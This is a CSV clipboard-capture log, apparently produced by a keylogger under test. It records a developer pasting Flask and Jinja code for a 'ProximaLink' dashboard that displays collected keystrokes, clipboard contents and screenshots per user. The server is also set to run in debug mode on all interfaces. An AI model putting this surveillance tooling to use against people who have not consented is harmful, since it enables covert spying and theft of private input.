Timestamp,Username,IP,Data
2024-07-03 10:32:30,Toshiba,192.168.100.200,"<!-- screenshots.html -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots Grid</title>
    <style>
        /* CSS for grid layout */
        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
            padding: 20px;
        }
        .grid-item {
            position: relative;
            cursor: pointer;
        }
        .grid-item img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>
    <div class=""grid-container"">
        {% for screenshot in screenshots %}
        <div class=""grid-item"">
            <a href=""{{ screenshot.image_path }}"" target=""_blank"">
                <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"">
            </a>
        </div>
        {% endfor %}
    </div>
</body>
</html>
"
2024-07-03 10:33:08,Toshiba,192.168.100.200,about:blank#blocked
2024-07-03 10:34:42,Toshiba,192.168.100.200,"{% for screenshot in screenshots %}
{{ screenshot.filename }}
{% endfor %}"
2024-07-03 10:35:38,Toshiba,192.168.100.200,"<!-- screenshot.html -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots</title>
    <style>
        /* CSS for styling thumbnails */
        .thumbnail {
            display: inline-block;
            margin: 10px;
        }
        .thumbnail img {
            width: 200px; /* Adjust size as needed */
            height: auto; /* Maintain aspect ratio */
            display: block;
        }
    </style>
</head>
<body>
    <div class=""thumbnails"">
        {% for screenshot in screenshots %}
        <div class=""thumbnail"">
            <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"">
            <p>{{ screenshot.filename }}</p>
        </div>
        {% endfor %}
    </div>
</body>
</html>
"
2024-07-03 10:38:05,Toshiba,192.168.100.200,screenshots
2024-07-03 10:38:40,Toshiba,192.168.100.200,{% for screenshot in screenshots %}
2024-07-03 10:41:47,Toshiba,192.168.100.200,"def get_screenshot_logs():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, type, image_path FROM screenshot_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    return logs


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        print(user_dir)
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        print(user_dir_path)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")
        print(screenshot_dir)

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    print(screenshot_path)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                            # Add more details as needed
                        }
                    )

    return screenshots"
2024-07-03 10:43:43,Toshiba,192.168.100.200,"# server.py

from flask import Flask, render_template, g
import sqlite3
import os

app = Flask(__name__)
DB_FILE = ""./db/keylogs.db""
SCREENSHOT_DIR = r""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData""


def get_db():
    db = getattr(g, ""_database"", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, ""_database"", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute(""SELECT DISTINCT username FROM logs"")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'keystroke' as type FROM logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs_from_db():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, type, image_path FROM screenshot_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    return logs


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        print(user_dir)
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        print(user_dir_path)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")
        print(screenshot_dir)

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    print(screenshot_path)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                            # Add more details as needed
                        }
                    )

    return screenshots


@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs_from_db()
    return render_template(""clipboard.html"", screenshots=screenshots)


@app.route(""/"")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    return render_template(""index.html"", unique_users=unique_users, all_logs=all_logs)


@app.route(""/clip"")
def clipboard():
    clipboard_logs = get_clipboard_logs()
    return render_template(
        ""clipboard.html"",
        clipboard_logs=clipboard_logs,
    )


if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=8080, debug=True)
"
2024-07-03 10:45:39,Toshiba,192.168.100.200,"@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs_from_db()
    return render_template(""clipboard.html"", screenshots=screenshots)"
2024-07-03 10:46:01,Toshiba,192.168.100.200,"updated the server.py
# server.py

from flask import Flask, render_template, g
import sqlite3
import os

app = Flask(__name__)
DB_FILE = ""./db/keylogs.db""
SCREENSHOT_DIR = r""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData""


def get_db():
    db = getattr(g, ""_database"", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, ""_database"", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute(""SELECT DISTINCT username FROM logs"")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'keystroke' as type FROM logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs_from_db():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, type, image_path FROM screenshot_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    return logs


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        print(user_dir)
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        print(user_dir_path)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")
        print(screenshot_dir)

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    print(screenshot_path)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                            # Add more details as needed
                        }
                    )

    return screenshots


@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs_from_db()
    return render_template(""clipboard.html"", screenshots=screenshots)


@app.route(""/"")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    return render_template(""index.html"", unique_users=unique_users, all_logs=all_logs)


@app.route(""/clip"")
def clipboard():
    clipboard_logs = get_clipboard_logs()
    return render_template(
        ""clipboard.html"",
        clipboard_logs=clipboard_logs,
    )


if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=8080, debug=True)


and now /screenshot page is blank"
2024-07-03 10:48:50,Toshiba,192.168.100.200,"{% for screenshot in screenshots %} {{ screenshot.filename }}
{{ screenshot.filename }}

 {% endfor %}"
2024-07-03 10:50:05,Toshiba,192.168.100.200,"<!-- clipboard.html -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots</title>
</head>
<body>
    <h1>Screenshots</h1>
    <div class=""container"">
        <div class=""row"">
            {% for screenshot in screenshots %}
            <div class=""col-md-3"">
                <a href=""{{ screenshot.image_path }}"" target=""_blank"">
                    <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"" class=""img-thumbnail"">
                </a>
                <p>{{ screenshot.filename }}</p>
                <p>Username: {{ screenshot.username }}</p>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"
2024-07-03 10:50:05,Toshiba,192.168.100.200,"<!-- screenshot.html -->

<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Screenshots</title>
    <style>
      /* CSS for styling thumbnails */
      .thumbnail {
        display: inline-block;
        margin: 10px;
      }
      .thumbnail img {
        width: 200px; /* Adjust size as needed */
        height: auto; /* Maintain aspect ratio */
        display: block;
      }
    </style>
  </head>
  <body>
    <div class=""thumbnails"">
      {% for screenshot in screenshots %}
      <div class=""thumbnail"">
        <img
          src=""{{ screenshot.image_path }}""
          alt=""{{ screenshot.filename }}""
        />
        <p>{{ screenshot.filename }}</p>
      </div>
      {% endfor %}
    </div>
  </body>
</html>
"
2024-07-03 10:50:11,Toshiba,192.168.100.200,"<!-- clipboard.html -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots</title>
</head>
<body>
    <h1>Screenshots</h1>
    <div class=""container"">
        <div class=""row"">
            {% for screenshot in screenshots %}
            <div class=""col-md-3"">
                <a href=""{{ screenshot.image_path }}"" target=""_blank"">
                    <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"" class=""img-thumbnail"">
                </a>
                <p>{{ screenshot.filename }}</p>
                <p>Username: {{ screenshot.username }}</p>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"
2024-07-03 10:50:24,Toshiba,192.168.100.200,"Screenshots

Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:


Username:"
2024-07-03 10:50:44,Toshiba,192.168.100.200,"Screenshots
{% for screenshot in screenshots %}
{{ screenshot.filename }}
{{ screenshot.filename }}

Username: {{ screenshot.username }}

{% endfor %}"
2024-07-03 10:52:09,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots</title>
</head>
<body>
    <h1>Screenshots</h1>
    <div class=""container"">
        <div class=""row"">
            {% for screenshot in screenshots %}
            <div class=""col-md-3"">
                <a href=""{{ screenshot.image_path }}"" target=""_blank"">
                    <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"" class=""img-thumbnail"">
                </a>
                <p>{{ screenshot.filename }}</p>
                <p>Username: {{ screenshot.username }}</p>
            </div>
            {% endfor %}
        </div>
    </div>
</body>
</html>
"
2024-07-03 10:52:25,Toshiba,192.168.100.200,"def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs():
    conn = get_db()
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, type, image_path FROM screenshot_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    return logs"
2024-07-03 10:53:14,Toshiba,192.168.100.200,get_screenshot_logs_from_db
2024-07-03 10:54:40,Toshiba,192.168.100.200,"def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                        }
                    )
    return screenshots"
2024-07-03 10:54:53,Toshiba,192.168.100.200,"Screenshots
screenshot_20240703_095316.png
screenshot_20240703_095316.png

Username: Toshiba

screenshot_20240703_095318.png
screenshot_20240703_095318.png

Username: Toshiba

screenshot_20240703_095321.png
screenshot_20240703_095321.png

Username: Toshiba

screenshot_20240703_095328.png
screenshot_20240703_095328.png

Username: Toshiba

screenshot_20240703_095329.png
screenshot_20240703_095329.png

Username: Toshiba

screenshot_20240703_095331.png
screenshot_20240703_095331.png

Username: Toshiba"
2024-07-03 10:55:06,Toshiba,192.168.100.200,"<!-- screenshots.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Screenshots</title>
</head>
<body>
    <h1>Screenshots</h1>
    {% for screenshot in screenshots %}
        <div>
            <h3>{{ screenshot.filename }}</h3>
            <p>Username: {{ screenshot.username }}</p>
            <img src=""{{ screenshot.image_path }}"" alt=""Screenshot"">
        </div>
    {% endfor %}
</body>
</html>
"
2024-07-03 10:55:16,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Screenshots</title>
  </head>
  <body>
    <h1>Screenshots</h1>
    <div class=""container"">
      <div class=""row"">
        {% for screenshot in screenshots %}
        <div class=""col-md-3"">
          <a href=""{{ screenshot.image_path }}"" target=""_blank"">
            <img
              src=""{{ screenshot.image_path }}""
              alt=""{{ screenshot.filename }}""
              class=""img-thumbnail""
            />
          </a>
          <p>{{ screenshot.filename }}</p>
          <p>Username: {{ screenshot.username }}</p>
        </div>
        {% endfor %}
      </div>
    </div>
  </body>
</html>
"
2024-07-03 10:55:59,Toshiba,192.168.100.200,"Screenshots
screenshot_20240703_095316.png
screenshot_20240703_095316.png

Username: Toshiba

screenshot_20240703_095318.png
screenshot_20240703_095318.png

Username: Toshiba

screenshot_20240703_095321.png
screenshot_20240703_095321.png

Username: Toshiba

screenshot_20240703_095328.png
screenshot_20240703_095328.png

Username: Toshiba

screenshot_20240703_095329.png
screenshot_20240703_095329.png

Username: Toshiba

screenshot_20240703_095331.png
screenshot_20240703_095331.png

Username: Toshiba"
2024-07-03 10:57:15,Toshiba,192.168.100.200,"C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095316.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095318.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095321.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095328.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095329.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095331.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095332.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095333.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095404.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095434.png
C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095504.png"
2024-07-03 10:58:40,Toshiba,192.168.100.200,C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot\screenshot_20240703_095316.png
2024-07-03 11:00:06,Toshiba,192.168.100.200,"<main class=""col-md-10 py-3"">
          {% if all_logs %}
          <div class=""row row-data"">
            {% for log in all_logs %}
            <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
              <p>{{ log.text }}</p>
              <p class=""timestamp text-left"">{{ log.timestamp }}</p>
            </div>
            {% endfor %}"
2024-07-03 11:01:10,Toshiba,192.168.100.200,"<div class=""col-md-3"">
          <a href=""{{ screenshot.image_path }}"" target=""_blank"">
            <img src=""{{ screenshot.image_path }}"" alt=""{{ screenshot.filename }}"" class=""img-thumbnail"">
          </a>
          <p>{{ screenshot.filename }}</p>
          <p>Username: {{ screenshot.username }}</p>
        </div>"
2024-07-03 11:02:11,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>Screenshots</title>
  <style>
    .thumbnail {
      max-width: 100%;
      height: auto;
    }
  </style>
</head>
<body>
  <h1>Screenshots</h1>
  <div class=""container"">
    <div class=""row"">
      <div class=""col-md-3"">
        <a href=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095316.png"" target=""_blank"">
          <img src=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095316.png"" alt=""screenshot_20240703_095316.png"" class=""thumbnail"">
        </a>
        <p>Username: Toshiba</p>
      </div>
      <div class=""col-md-3"">
        <a href=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095318.png"" target=""_blank"">
          <img src=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095318.png"" alt=""screenshot_20240703_095318.png"" class=""thumbnail"">
        </a>
        <p>Username: Toshiba</p>
      </div>
      <!-- Add more similar blocks for each screenshot -->
    </div>
  </div>
</body>
</html>
"
2024-07-03 11:02:32,Toshiba,192.168.100.200,"<a href=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095316.png"" target=""_blank"">
            <img src=""file:///C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot/screenshot_20240703_095316.png"" alt=""screenshot_20240703_095316.png"" class=""thumbnail"">
          </a>"
2024-07-03 11:03:46,Toshiba,192.168.100.200,/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba
2024-07-03 11:12:09,Toshiba,192.168.100.200,"Not allowed to load local resource: file:///C:/Screenshot/screenshot_20240703_095316.png
screenshots:1  Not allowed to load local resource: file:///C:/Screenshot/screenshot_20240703_095318.png
screenshots:1  Not allowed to load local resource: file:///C:/Screenshot/screenshot_20240703_095316.png"
2024-07-03 11:13:56,Toshiba,192.168.100.200,"@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs()
    return render_template(""clipboard.html"", screenshots=screenshots)"
2024-07-03 11:15:39,Toshiba,192.168.100.200,screenshot
2024-07-03 13:00:17,Toshiba,192.168.100.200,"Not allowed to load local resource: file:///C:/Screenshot/screenshot_20240703_095318.png
"
2024-07-03 13:00:57,Toshiba,192.168.100.200,"python -m http.server 8000 --directory C:/Users/Toshiba/Desktop/D/Designing/Python/Django/ProximaLinkMonitoringApp/keylogger_project/test/LoggedData/Toshiba/Screenshot
"
2024-07-03 13:01:20,Toshiba,192.168.100.200,http://localhost:8000
2024-07-03 13:02:33,Toshiba,192.168.100.200,Screenshot
2024-07-03 13:03:29,Toshiba,192.168.100.200,http://localhost:8000/screenshot_20240703_095316.png
2024-07-03 13:07:46,Toshiba,192.168.100.200,"<!-- screenshots.html -->

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Screenshots</title>
    <style>
        .thumbnail {
            width: 200px;
            height: 150px;
            object-fit: cover;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Screenshots</h1>
    <div class=""container"">
        <div class=""row"">
            {% for screenshot in screenshots %}
            <div class=""col-md-4"">
                <img src=""{{ url_for('serve_screenshot', filename=screenshot.filename) }}""
                     alt=""{{ screenshot.filename }}""
                     class=""thumbnail""
                     onclick=""openOverlay('{{ url_for('serve_screenshot', filename=screenshot.filename) }}')""
                />
                <p>{{ screenshot.filename }}</p>
                <p>Username: {{ screenshot.username }}</p>
            </div>
            {% endfor %}
        </div>
    </div>

    <!-- Overlay -->
    <div id=""overlay"" class=""overlay"" onclick=""closeOverlay()"">
        <span class=""close"">&times;</span>
        <div class=""overlay-content"">
            <img id=""overlay-img"" src="""" alt=""Screenshot"">
        </div>
    </div>

    <script>
        function openOverlay(imageUrl) {
            document.getElementById(""overlay-img"").src = imageUrl;
            document.getElementById(""overlay"").style.display = ""block"";
        }

        function closeOverlay() {
            document.getElementById(""overlay"").style.display = ""none"";
        }
    </script>
</body>
</html>
"
2024-07-03 13:08:07,Toshiba,192.168.100.200,"<div class=""container"">
        <div class=""row"">
            {% include 'screenshots.html' %}
        </div>
    </div>"
2024-07-03 13:08:34,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>ProximaLink Dashboard</title>
    <link
      rel=""stylesheet""
      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />
  </head>
  <body>
    <header class=""bg-primary text-white text-center py-3"">
      <h1>ProximaLink Dashboard</h1>
      <p>Welcome to the monitoring dashboard.</p>
    </header>
    <div class=""container-fluid"">
      <div class=""row"">
        <aside class=""col-md-2 bg-light py-3"">
          <h2>Users</h2>
          <ul class=""list-unstyled"">
            {% if unique_users %} {% for user in unique_users %}
            <li class=""user-item"">{{ user }}</li>
            {% endfor %} {% else %}
            <p>No users found yet.</p>
            {% endif %}
          </ul>
        </aside>
        <main class=""col-md-10 py-3"">
          {% if all_logs %}
          <div class=""row row-data"">
            {% for log in all_logs %}
            <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
              <p>{{ log.text }}</p>
              <p class=""timestamp text-left"">{{ log.timestamp }}</p>
            </div>
            {% endfor %}
          </div>
          {% else %}
          <!-- Display a message if no logs are found -->
          <div class=""alert alert-info text-center"" role=""alert"">
            No logs found yet. Monitor activity for data to appear.
          </div>
          {% endif %}
        </main>
      </div>
    </div>
    <footer class=""bg-primary text-white text-center py-3 mt-3"">
      <p>ProximaLink Monitoring &copy; 2024</p>
    </footer>
    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
  </body>
</html>
"
